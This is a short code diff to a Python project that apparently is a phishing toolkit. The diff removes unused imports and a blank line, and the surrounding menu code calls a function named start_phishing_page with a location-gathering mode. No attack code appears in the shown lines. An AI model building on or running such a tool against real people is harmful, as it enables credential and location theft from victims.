@@ -4,13 +4,11 @@
 #    This is free software, and you are welcome to redistribute it
 #    under certain conditions; you can read LICENSE for details.
 #
-import os
 import time
 
 import Defs.ActionManager.simple_informant as simple_informant
 import Defs.LocalizationManager.lang_action_manager.lang_main_runner as localization
 import Defs.LocalizationManager.lang_global_usage as global_localization
-from Defs.ImportManager.unsorted_will_be_replaced import chmod
 from Defs.ImportManager.unsorted_will_be_replaced import copyfile
 from Defs.ImportManager.unsorted_will_be_replaced import mkdir
 from Defs.ImportManager.unsorted_will_be_replaced import path
@@ -227,7 +225,6 @@ def start_main_menu():
             lang_start_main_menu["additional_module_location_operation_modes"])
         customOption = input(global_localization.input_line)
         start_phishing_page("LOCATION", customOption)
-
     else:
         start_main_menu()
 
